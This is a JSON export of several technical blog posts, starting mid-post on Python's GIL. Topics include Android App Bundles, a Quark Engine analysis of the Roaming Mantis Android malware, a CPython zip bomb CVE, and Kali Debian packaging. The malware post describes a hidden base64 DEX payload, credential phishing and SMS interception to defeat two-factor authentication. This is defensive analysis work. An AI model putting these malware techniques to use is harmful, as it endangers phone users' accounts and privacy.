to shared library 1gcc share_method.c -shared -o share_method.so Then we can use the ctypes module in Python to invoke the method from the C program in the Python program. 123456from ctypes import cdllif __name__ == &#x27;__main__&#x27;: lib = cdll.LoadLibrary(&quot;share_method.so&quot;) lib.say_hello() The output of this program is below: This is a function call from C Language If we want to do CPU-bound analysis, we can modify our C code to the below: 1234567void loop() &#123;// create a dead loop here printf(&quot;This is a function call from infinite loop \\n&quot;); while (1) &#123; ; &#125;&#125; It will be similar to CPU-bound calculations. Then we can use Python Thread to call this method via ctypes 123456789from ctypes import cdllfrom threading import Threadif __name__ == &#x27;__main__&#x27;: lib = cdll.LoadLibrary(&quot;share_method.so&quot;) t = Thread(target=lib.loop) t.start() Finally, we can see two of our CPUs got high usage with the top command. ConclusionGIL seems to be an inevitable problem when dealing with multi-threaded programming, but it is still useful in IO-bound tasks such as web crawlers and file operations, etc. So it depends on the situation you have to solve. The conclusion is below: If you want to deal with IO-bound tasks, then use the multi-thread with pool. If you want to deal with CPU-bound tasks, then use the multi-process with pool. Or you can also use some techniques above to bypass the GIL.","raw":null,"content":null,"categories":[],"tags":[]},{"title":"Android APP Bundle","slug":"Android-APP-Bundle","date":"2021-10-12T07:22:48.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2021/10/12/Android-APP-Bundle/","link":"","permalink":"https://krnick.github.io/2021/10/12/Android-APP-Bundle/","excerpt":"","text":"Android App Bundle(aka aab)Google has announced that all applications that need to upload to Google Play have to use the format called “aab”, which means Android App Bundle. The reason why Google using the aab format can be organized with two things: It helps reduce the size of downloaded files. It can generate APKs dynamically for various device configurations such as different CPUs, screen size, language, etc. However, from the view of the malware analysts, it should not be a problem because the aab format only employs when publishing and users’ devices still get the APK source file generated by bundletool from Google Play. Here is the step by step to analyze the aab format application How to build an “aab” file when you complete your project by yourselfOpen Android Studio -&gt; Build -&gt; Build Bundle(s) &#x2F; APK(s) -&gt; Build Bundle(s) The aab file will locate in: /Users/$USER/AndroidStudioProjects/Test/app/build/outputs/bundle/debug/app-debug.aab It is literally another kind of compressed file, and its directory after unzipping is as shown below. You may probably know, the crucial file DEX locate in the dex directory. Convert .aab to .apk fileUsing the command-line tool bundletool, you can convert aab files into APK files with just one command. 1bundletool build-apks --bundle=app-debug.aab --output=my_app.apks You may notice that the output of the APK is suffixed with “s”, which means it is a bunch of APK files in an archive. All of these APKs are generated based on a different language, screen size, etc. Now you can pick any of them to analyze as usual. Reference:https://developer.android.com/studio/command-line/bundletool","raw":null,"content":null,"categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"https://krnick.github.io/tags/Android/"}]},{"title":"How to draft a new release on PyPi with Github Action","slug":"How-to-draft-a-new-release-on-PyPi-with-Github-Action","date":"2021-10-07T06:54:14.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2021/10/07/How-to-draft-a-new-release-on-PyPi-with-Github-Action/","link":"","permalink":"https://krnick.github.io/2021/10/07/How-to-draft-a-new-release-on-PyPi-with-Github-Action/","excerpt":"","text":"How to draft a new release on PyPi with Github ActionAfter updating the version from everywhere in the codebase such as __init__.py, docs and debian package, you can click “Releases” for drafting a new version release. After that, you can click the “Draft a new release”. The next step is to fill out the version number you want to release, and the changelog from the last release to now. After completing the information for this version, you can click “Publish release” to publish this version. Once this version is released, Github Action will initiate a process to publish it on PyPi automatically. :::infoPlease note that there is a limitation that you cannot upload twice with the same release version number.","raw":null,"content":null,"categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://krnick.github.io/tags/python/"},{"name":"github","slug":"github","permalink":"https://krnick.github.io/tags/github/"},{"name":"pypi","slug":"pypi","permalink":"https://krnick.github.io/tags/pypi/"}]},{"title":"Android Malware Analysis - Roaming Mantis","slug":"Roaming-Mantis-with-Quark-Engine","date":"2021-09-30T10:02:23.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2021/09/30/Roaming-Mantis-with-Quark-Engine/","link":"","permalink":"https://krnick.github.io/2021/09/30/Roaming-Mantis-with-Quark-Engine/","excerpt":"","text":"Analyze Roaming Mantis with Quark-Engine IntroductionRoaming Mantis is a notorious malware that was first discovered in 2018 and aims at the Asian region. In the past two years, it has evolved and spread around the world. This malware intends to steal personal sensitive data (e.g. account information, SMS messages, and voice calls). Also, the malware bypassed the two-factor authentication by monitoring SMS messages. According to the report from Kaspersky Lab, the main distribution of this malware is using DNS hijacking through a compromised router. As long as the user connects to the router, their DNS lookup will be redirected to the malicious URL. After the user connects to the malicious website, they will be prompted to download the Google update application, which turns out to be the Android malware. In this report, we focus on the APK downloaded by victims who were redirected to the malicious URL. We aim at showing how malware analysts can use Quark Engine to quickly understand what this malware does to the victim. This malware contains a DEX file encoded by the base64 algorithm. Therefore, we will first demonstrate how we can use sets of detection rules to quickly find where to decode the base64 algorithm and where to load the DEX file in the malware. After decrypting the DEX file. We then further investigate malicious activities in the DEX file with sets of our detection rules. Also, we prove that obfuscation techniques are useless due to the magic design of Quark Engine. All in all, we show that by using Quark and detection rule sets, malware analysis can be so much fun. Investigating the Android APKSummary Report for the APK In this report, our engine found 10 potential malicious activities with detection rules accordingly. As for the confidence, scores, and weight, please take a look at our talk at DEFCON Blue Team Village videos on YouTube. We explain everything there. The scoring system will only take effect if we have enough detection rules. Before we accumulate enough rules, we set the scores and weights all the same. Therefore, the risk levels and total scores are for reference only. After generating the summary report, we then use an automatic technique to classify these 10 potential malicious activities. Exploring Malicious ActivitiesRule Classification: onCreate The picture above shows that 5 suspicious activities were found under the function onCreate. This picture can help malware analysts to understand the malware in an easy way. As shown above, we found five behaviors in function onCreate. Despite that rules are not listed in the right order, we can still piece them together and tell a story. With the descriptions in the table, we can simply and quickly guess that this function decodes and load the suspicious payload. After validating through reading the smali-like source codes, our guess is right! And the right order of the behaviors is: Get the absolute path of the file and store it in a string. Open a file from the given absolute path of the file. Read a file from the assets directory. Write file after Base64 decoding. Load additional DEX files dynamically. Rule Classification: a As shown above, it is obvious that function a is about to do method reflection, MAGIC! Rule Classification: run Anther method reflection detected!! MAGIC! Decrypting the DEX fileAs mentioned above, we know that the Roaming Mantis reads a file from the assets directory and uses Base64 to decode it. For further investigation, we find the file of the DEX payload. After unzipping the “assets&#x2F;db” file, we then use the Base64 to decode it and rename it Roaming_Mantis.dex. Now we have the DEX payload!. Summary Report of the DEX fileNow, let’s do the summary report again for the DEX payload, we found 37 suspicious activities. We simply summarize these suspicious behaviors into twelve categories. Connect to the remote server Start a web server Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMS Access network information Access phone information Access personal information Record audio&#x2F;video Load external class Access currently running applications and installed packages Make a phone call Open a web page Install other APKs from the file Next, we will introduce some interesting and highly suspicious activities to you based on the above categories. 1. Connect to the remote serverRule Classification: a&#x2F;b;a C2 connections are common in malware. This is a clue for further C2 investigation. 2. Start a web serverRule Classification: b&#x2F;g;run Our investigation proves that the malware starts a web server and tricks users into filling credentials like username, password, etc. 3. Monitor&#x2F;Delete&#x2F;Send SMS&#x2F;MMSRule Classification: com&#x2F;n;b Rule Classification: com&#x2F;Loader$s;onReceive Rule Classification: com&#x2F;Loader;start Our investigation proves that these operations concerning SMS might launch activities like: Steal verification code for the two-factor authentication. Steal verification code during online purchasing. 4. Access phone informationRule Classification: a&#x2F;a;a Rule Classification: com&#x2F;Loader$ag$1;a Our investigation proves that these operations concerning “access phone information” might launch activities like: Query the IMEI number to targeting the Asian region. Check the SIM card status just make sure the victim’s phone works. 5. Record audio&#x2F;videoRule Classification: com&#x2F;j;a Thrilling! This malware records your audio&#x2F;video! ConclusionThis report shows how malware analysts can use the quark engine to quickly guess behaviors of malware and to quickly validate their guess through call graphs and the classification table. In this report, we show that Quark Engine bypassed the obfuscation techniques used in Roaming Mantis. Also, this time we provide some useful rule sets for the detection. E.g. detecting payload decryption, dex loader, method reflection, SMS operation, potential c2 connection etc. And all these rules are generated by using our auto-generate tools. We’re proud of our work and we love to play around with it. So, if you want to take a sip of the quark engine. Please visit our GitHub repository: https://bit.ly/2ISYG2s And the rules used in this report. https://bit.ly/3jAOkAv You can generate rules by yourself if you can’t wait for our next rule release! https://bit.ly/2IJNxkE","raw":null,"content":null,"categories":[],"tags":[{"name":"Android","slug":"Android","permalink":"https://krnick.github.io/tags/Android/"},{"name":"Malware","slug":"Malware","permalink":"https://krnick.github.io/tags/Malware/"}]},{"title":"CVE-2019-9674 Zip bomb vulnerability in CPython Lib/zipfile.py","slug":"CPython-zipfile-Code-Tracing","date":"2021-09-30T08:39:10.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2021/09/30/CPython-zipfile-Code-Tracing/","link":"","permalink":"https://krnick.github.io/2021/09/30/CPython-zipfile-Code-Tracing/","excerpt":"","text":"BackgroundI reported a zip bomb vulnerability to the CPython community in 2019. Here are all the interesting resources and ideas. Issue Discussion on BPO CVE-2019-9674 Decompression pitfall I wrote for official documentation Pull Request related it PyCon Korea 2019 - Click Click Boom! Bombs Over Our Minds zipfile analysisAccording to Black Hat’s Cara Marie research, there are some solutions against Zip Bomb. By limiting the size of the block to be read at a time, if there is still data remaining after the block that needs to be decompressed after reading this block, it is considered that it is possible to be a Zip Bomb. Below is Cara Marie code 12345678import zlibdef decompress(data, maxsize=1024000): dec = zlib.decompressobj() data = dec.decompress(data, maxsize) if dec.unconsumed_tail: raise ValueError(&quot;Possible bomb&quot;) del dec return data As you can see, the strategy to defeating the zip bomb is by limiting a block, in this case, is max size 102400. However, we take a look at the Python standard library, zipfile. According to Cara Marie’s approach, we try to figure out the difference between zipfile and zlib and why we can’t use zipfile directly for preventing zip bombs, so we started to study zipfile source code. zipfileSince I focus on the zip format and pick the most commonly used algorithm, DEFLATED algorithm. Inside the zipfile, we can see the location of unzipped function, starting at line 702, getting the zlib object, and finally returning the object. zlib.decompressobj(-15) 123456789101112131415def _get_decompressor(compress_type): if compress_type == ZIP_STORED: return None elif compress_type == ZIP_DEFLATED: return zlib.decompressobj(-15) elif compress_type == ZIP_BZIP2: return bz2.BZ2Decompressor() elif compress_type == ZIP_LZMA: return LZMADecompressor() else: descr = compressor_names.get(compress_type) if descr: raise NotImplementedError(&quot;compression type %d (%s)&quot; % (compress_type, descr)) else: raise NotImplementedError(&quot;compression type %d&quot; % (compress_type,)) From the above code, we can know that the zipfile is based on what zlib does. So we have to deep dive into what zlib did? zlibAccording to the zlib documentation There are two ways to compression and decompression, .compress() and .decompress() will fit all files into memory at once. In contrast to the method of the object. It using .compressobj() and .decompressobj() which won’t fit into memory at once. There are two ways to compress&#x2F;decompress. .compress() and .decompress() will put the entire file into memory at a time .compressobj() and .decompressobj() separate the file , compress&#x2F;decompress one block at a time However, the official documentation does not clearly explain how to use the API to decompress files. The purpose of this method is to obtain the file data stream and decompress it through the Low-Level method. And we went back to the zipfile module and found that they had already done the decompression of zlib, so we planned to apply the patch for zipfile first. In the way that zipfile belongs to decompressobj, we have the first way to accumulate chunks. As long as we can find out where to do the decompression of chunks, we accumulate it and give a threshold. If it exceeds, then consider that it is possible to be the zip bomb. Get back at the zipfile Starting with the object Line 706 1return zlib.decompressobj(-15) Line 791 It is the place where the class of zlib.decompressobj(-15) object is obtained and initialized. which belongs to ZipExtFile class 1def __init__(self, fileobj, mode, zipinfo, decrypter=None,close_fileobj=False): Let’s find out what fileobj is Line 1545 1return ZipExtFile(zef_file, mode, zinfo, zd, True) Return the class, and use zef_file, then follow zef_file Line 719 _SharedFile being initialized 1def __init__(self, file, pos, close, lock, writing): Here we know that when zlib is decompressed, you can’t start decompressing directly to Streaming, and you need to skip the file encoding in front of the zip file. Line 759 In class _Tellable: to initialize the position of the indicator that gets the file descriptor 123def __init__(self, fp): self.fp = fp self.offset = 0 and then Line 977 12345678910elif self._compress_type == ZIP_DEFLATED: n = max(n, self.MIN_READ_SIZE) data = self._decompressor.decompress(data, n) self._eof = (self._decompressor.eof or self._compress_left &lt;= 0 and not self._decompressor.unconsumed_tail) if self._eof: data += self._decompressor.flush() We observed that after choosing to use the ZIP_DEFLATED compression algorithm, we did a function max to get n. Key Point1max(n, self.MIN_READ_SIZE) When you use zlib.decompressobj as a block, how big is your block?, self.MIN_READ_SIZE is preset to 4096 bytes, which is the size of a page in the operating system. Cara Marie’s solution12345678import zlibdef decompress(data, maxsize=1024000): dec = zlib.decompressobj() data = dec.decompress(data, maxsize) if dec.unconsumed_tail: raise ValueError(&quot;Possible bomb&quot;) del dec return data It sets maxsize to 102400 bytesAccording to the official document Decompress.decompress(data, max_length&#x3D;0)Decompress data, returning a bytes object containing the uncompressed data corresponding to at least part of the data in the string. This data should be concatenated to the output produced by any preceding calls to the decompress() method. Some of the input data may be preserved in internal buffers for later processing. If the optional parameter max_length is non-zero then the return value will be no longer than max_length. This may mean that not all of the compressed input can be processed, and unconsumed data will be stored in the attribute unconsumed_tail. This byte string must be passed to a subsequent call to decompress() if decompression is to continue. If max_length is zero then the whole input is decompressed, and unconsumed_tail is empty. Changed in version 3.6: max_length can be used as a keyword argument. Max_length represents the file block size that can be read into the memory at a time and is marked with unconsumed_tail to see if any remaining files need to be decompressed. Therefore, his idea is more than 102400 bytes. If there is any remaining data, it means there may be a zip bomb.","raw":null,"content":null,"categories":[],"tags":[{"name":"vulnerability","slug":"vulnerability","permalink":"https://krnick.github.io/tags/vulnerability/"},{"name":"python","slug":"python","permalink":"https://krnick.github.io/tags/python/"}]},{"title":"Debian Packaging","slug":"Debian-Packaging","date":"2021-05-03T08:10:42.000Z","updated":"2025-06-30T10:40:10.168Z","comments":true,"path":"2021/05/03/Debian-Packaging/","link":"","permalink":"https://krnick.github.io/2021/05/03/Debian-Packaging/","excerpt":"","text":"Debian PackagingA while ago, I would like to package Quark to Debian package since we want to make Quark be part of Kali Linux. You can have a look at the link below. Kali Linux issue 0007121 Kali Linux Release1. Prepare your Kali Linux virtual machine to build the Debian package. Virtualbox Kail Linux image for virtualbox Update your kali Linux package source123echo &quot;deb http://http.kali.org/kali kali-rolling main non-free contrib&quot; | sudo tee /etc/apt/sources.listsudo apt-get update After setting up your virtual machine, you have to install the required packages based on the official documentation on this website. Install the required dependencies123sudo apt install -y packaging-dev apt-file gitk mrsudo apt-get install -y devscripts debhelper dh-make git-buildpackage sbuild dh-python python3-all Set up sbuild and log in again after completion123456789sudo mkdir -p /srv/chroots/cd /srv/chroots/sudo sbuild-createchroot --keyring=/usr/share/keyrings/kali-archive-keyring.gpg --arch=amd64 --components=main,contrib,non-free --include=kali-archive-keyring kali-dev kali-dev-amd64-sbuild http://http.kali.org/kaliecho &quot;source-root-groups=root,sbuild&quot; | sudo tee -a /etc/schroot/chroot.d/kali-dev-amd64-sbuild*sudo sbuild-adduser $USER 2. Creating the Debian filesThe Debian package needs that the following four files are required in the debian directory. control copyright changelog rules Here is the official documentation on how to write all four files. 3. Importing the Quark projectPlease replace the version number you would like to update. 123456789mkdir -p ~/kali/packages/quark-engine ~/kali/upstream/wget https://github.com/quark-engine/quark-engine/archive/refs/tags/v21.4.3.tar.gz -O ~/kali/upstream/quark-engine_21.4.3.orig.tar.gzcd /home/kali/kali/packages/quark-enginegit initgbp import-orig ~/kali/upstream/quark-engine_21.4.3.orig.tar.gz 4. Build Package1gbp buildpackage --git-builder=sbuild Then you will have the Quark .deb file if everything goes well. 5. Request package upgrade Register Kali Linux Bug Tracker Report an issue Report an issue by clicking the “Report Issue” Fill out the form Please choose the “Tool upgrade request” option in category and “kali-dev” option in product version and keep anything else default value. The next step is filling out the summary and the description. Attach the .deb file Upload the .deb file you just created earlier. Submit the issue When everything is all set, you can click “Submit issue”. Referencehttps://www.kali.org/docs/development/public-packaging/https://www.kali.org/docs/development/intro-to-packaging-example/https://www.kali.org/docs/development/setting-up-packaging-system/https://www.kali.org/docs/development/advanced-packaging-example/","raw":null,"content":null,"categories":[],"tags":[{"name":"Debian","slug":"Debian","permalink":"https://krnick.github.io/tags/Debian/"},{"name":"Linux","slug":"Linux","permalink":"https://krnick.github.io/tags/Linux/"},{"name":"Kali Linux","slug":"Kali-Linux","permalink":"https://krnick.github.io/tags/Kali-Linux/"}]},{"title":"Pipenv usage","slug":"pipenv","date":"2020-09-24T06:15:06.000Z","updated":"2025-06-30T10:40:10.169Z","comments":true,"path":"2020/09/24/pipenv/","link":"","permalink":"https://krnick.github.io/2020/09/24/pipenv/","excerpt":"","text":"Install from github1pipenv install -e git+https://github.com/quark-engine/quark-engine.git#egg=quark-engine First “quark-enigne”: user Second “quark-engine”: repo @develop: The branch what you want to install #egg&#x3D;quark-engine: The package name that will be recorded in pipenv","raw":null,"content":null,"categories":[],"tags":[{"name":"python","slug":"python","permalink":"https://krnick.github.io/tags/python/"},{"name":"git","slug":"git","permalink":"https://krnick.github.io/tags/git/"}]}]}